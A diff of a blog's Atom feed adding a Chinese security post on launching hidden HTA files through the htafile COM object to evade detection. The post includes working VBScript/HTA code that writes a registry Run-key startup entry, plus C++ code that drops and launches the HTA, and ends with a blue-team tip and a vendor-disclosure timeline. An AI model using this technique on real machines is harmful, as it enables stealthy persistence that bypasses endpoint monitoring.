@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://daffodi11.github.io</id>
     <title>Daffodil</title>
-    <updated>2022-02-17T03:18:29.277Z</updated>
+    <updated>2022-02-17T03:45:13.128Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://daffodi11.github.io"/>
     <link rel="self" href="https://daffodi11.github.io/atom.xml"/>
@@ -10,6 +10,170 @@
     <logo>https://daffodi11.github.io/images/avatar.png</logo>
     <icon>https://daffodi11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, Daffodil</rights>
+    <entry>
+        <title type="html"><![CDATA[利用HTML Application COM组件加载HTA 过检测修改注册表]]></title>
+        <id>https://daffodi11.github.io/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/</id>
+        <link href="https://daffodi11.github.io/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/">
+        </link>
+        <updated>2022-02-17T03:09:01.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="起源">起源</h2>
+<p>想法来自一天分析恶意样本时，发现进程链是Excel-&gt;mshta-&gt;dllhost。</p>
+<h2 id="研究">研究</h2>
+<p>使用OLEVIEW查看有关com组件<br>
+<img src="https://daffodi11.github.io/post-images/1645067653228.jpg" alt="" loading="lazy"><br>
+google发现 早有人对此进行了分析https://codewhitesec.blogspot.com/2018/07/lethalhta.html</p>
+<p>hta文件可以执行js与vbs脚本<br>
+js与vbs又可以调用wmi</p>
+<p>但是打开hta会有窗口闪出影响效果<br>
+这里有两种方案<br>
+1、移动窗口 修改大小<br>
+window.moveTo 4000,4000<br>
+window.resizeTo 0,0<br>
+这种方法窗口会有短暂的停留<br>
+2、添加样式<br>
+&lt;HTA:APPLICATION icon=&quot;#&quot; WINDOWSTATE=&quot;minimize&quot; SHOWINTASKBAR=&quot;no&quot;SYSMENU=&quot;no&quot; CAPTION=&quot;no&quot; /&gt;<br>
+当脚本运行时间过长时 桌面左下角会有窗口</p>
+<p>Emeric Nasi 通过设置属性 BORDER=&quot;none&quot; 结合前两种给出了最优方案<br>
+https://blog.sevagas.com/?Hide-HTA-window-for-RedTeam</p>
+<pre><code class="language-HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;HTA:APPLICATION icon=&quot;#&quot; WINDOWSTATE=&quot;normal&quot; SHOWINTASKBAR=&quot;no&quot; SYSMENU=&quot;no&quot;  CAPTION=&quot;no&quot; BORDER=&quot;none&quot; SCROLL=&quot;no&quot; /&gt;
+&lt;script type=&quot;text/vbscript&quot;&gt;
+ 
+Private Sub Hello()
+    CreateObject(&quot;WScript.Shell&quot;).run(&quot;calc&quot;)
+End Sub
+ 
+' Auto launch when VBA enabled
+Sub AutoOpen()
+    Hello
+End Sub
+ 
+window.resizeTo 0,0
+AutoOpen
+Close
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h4 id="利用hta调用wmi修改注册表">利用hta调用wmi修改注册表</h4>
+<pre><code class="language-HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;HTA:APPLICATION icon=&quot;#&quot; WINDOWSTATE=&quot;normal&quot; SHOWINTASKBAR=&quot;no&quot; SYSMENU=&quot;no&quot;  CAPTION=&quot;no&quot; BORDER=&quot;none&quot; SCROLL=&quot;no&quot; /&gt;
+&lt;script type=&quot;text/vbscript&quot;&gt;
+Private Sub Hello()
+const HKEY_CURRENT_USER = &amp;H80000001
+strKeyPath = &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+MultValueName = &quot;daffodiltest&quot;
+strComputer = &quot;.&quot;
+iValues = &quot;c:\windows\system32\notepad.exe&quot;
+Set oReg=GetObject(&quot;winmgmts:{impersonationLevel = impersonate}!\\&quot; &amp; strComputer &amp; &quot;\root\default:StdRegProv&quot;)
+oReg.CreateKey HKEY_CURRENT_USER,strKeyPath
+oReg.SetStringValue HKEY_CURRENT_USER,strKeyPath,MultValueName,iValues
+End Sub
+Sub AutoOpen()
+    Hello
+End Sub
+window.resizeTo 0,0
+AutoOpen
+Close
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<h2 id="cpp调用">CPP调用</h2>
+<pre><code class="language-CPP">	FILE * pFile;
+    pFile = fopen(&quot;C:\\Users\\Public\\TEST.HTA&quot;, &quot;w+&quot;);
+    if (pFile != NULL)
+	 {
+	    fprintf(pFile, &quot;&lt;!DOCTYPE html&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;html&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;head&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;HTA:APPLICATION icon=\&quot;#\&quot; WINDOWSTATE=\&quot;normal\&quot; SHOWINTASKBAR=\&quot;no\&quot; SYSMENU=\&quot;no\&quot;  CAPTION=\&quot;no\&quot; BORDER=\&quot;none\&quot; SCROLL=\&quot;no\&quot; /&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;script type=\&quot;text/vbscript\&quot;&gt;\n&quot;);
+		fprintf(pFile, &quot;Private Sub Hello()\n&quot;);
+		fprintf(pFile, &quot;const HKEY_CURRENT_USER = &amp;H80000001\n&quot;);
+		fprintf(pFile, &quot;strKeyPath = \&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\&quot;\n&quot;);
+		fprintf(pFile, &quot;MultValueName = \&quot;daffodiltest\&quot;\n&quot;);
+		fprintf(pFile, &quot;strComputer = \&quot;.\&quot;\n&quot;);
+		fprintf(pFile, &quot;iValues = \&quot;c:\\windows\\system32\\notepad.exe\&quot;\n&quot;);
+		fprintf(pFile, &quot;Set oReg=GetObject(\&quot;winmgmts:{impersonationLevel = impersonate}!\\\\\&quot; &amp; strComputer &amp; \&quot;\\root\\default:StdRegProv\&quot;)\n&quot;);
+		fprintf(pFile, &quot;oReg.CreateKey HKEY_CURRENT_USER,strKeyPath\n&quot;);
+		fprintf(pFile, &quot;oReg.SetStringValue HKEY_CURRENT_USER,strKeyPath,MultValueName,iValues\n&quot;);
+		fprintf(pFile, &quot;End Sub\n&quot;);
+		fprintf(pFile, &quot;Sub AutoOpen()\n&quot;);
+		fprintf(pFile, &quot;    Hello\n&quot;);
+		fprintf(pFile, &quot;End Sub\n&quot;);
+		fprintf(pFile, &quot;window.resizeTo 0,0\n&quot;);
+		fprintf(pFile, &quot;AutoOpen\n&quot;);
+		fprintf(pFile, &quot;Close\n&quot;);
+		fprintf(pFile, &quot;&lt;/script&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;/head&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;body&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;/body&gt;\n&quot;);
+		fprintf(pFile, &quot;&lt;/html&gt;\n&quot;);
+		fclose(pFile);
+	 }
+
+	GUID gHtafile = { 0x3050f4d8,0x98b5,0x11cf,{ 0xbb,0x82,0x00,0xaa,0x00,0xbd,0xce,0x0b } };
+	HRESULT hr;
+	IUnknownPtr pOut;
+	IPersistMonikerPtr pPersMon;
+	IMonikerPtr pMoniker;
+
+	MULTI_QI* rgQI = new MULTI_QI[1];
+	COSERVERINFO stInfo = { 0 };
+	WCHAR pwszTarget[MAX_PATH];
+	WCHAR pwszHta[MAX_PATH];
+
+	wcscpy_s(pwszTarget, MAX_PATH, L&quot;LOCALHOST&quot;);
+	wcscpy_s(pwszHta, MAX_PATH, L&quot;C:\\Users\\Public\\TEST.HTA&quot;);
+
+	rgQI[0].pIID = &amp;IID_IUnknown;
+	rgQI[0].pItf = NULL;
+	rgQI[0].hr = 0;
+
+	stInfo.pwszName = pwszTarget;
+	stInfo.dwReserved1 = 0;
+	stInfo.dwReserved2 = 0;
+	stInfo.pAuthInfo = nullptr;
+
+	CoInitialize(0);
+	hr = CreateURLMonikerEx(NULL, pwszHta, &amp;pMoniker, 0);
+	hr = CoCreateInstanceEx(gHtafile, NULL, CLSCTX_LOCAL_SERVER, NULL, 1, rgQI);
+
+	if (hr != S_OK)
+	{
+		printf(&quot;Creating htafile COM object failed on target&quot;);
+	}
+
+	pOut = rgQI[0].pItf;
+	hr = pOut-&gt;QueryInterface(&amp;pPersMon);
+
+	FakeObject* pFake = new FakeObject(pMoniker);
+	hr = pPersMon-&gt;Load(FALSE, pFake, NULL, STGM_READ);
+	pFake-&gt;Release();
+	pMoniker = NULL;
+	pPersMon = NULL;
+	pOut = NULL;
+</code></pre>
+<p>成功修改注册表启动项<br>
+<img src="https://daffodi11.github.io/post-images/1645069118151.jpg" alt="" loading="lazy"></p>
+<p>当然也可以执行其他的wmi命令 例如创建进程、修改环境变量等等</p>
+<h4 id="tips-for-blue-team">Tips for blue team</h4>
+<p>监控mshta 与 dllhost</p>
+<h4 id="时间线">时间线</h4>
+<p>2021-07-25 20:53:12	 上报相关厂商<br>
+2022-02-17 11:41:22   验证已修复并披露</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[文件捆绑：两种释放文件的CPP实现]]></title>
         <id>https://daffodi11.github.io/post/liang-chong-shi-fang-wen-jian-de-cpp-shi-xian/</id>
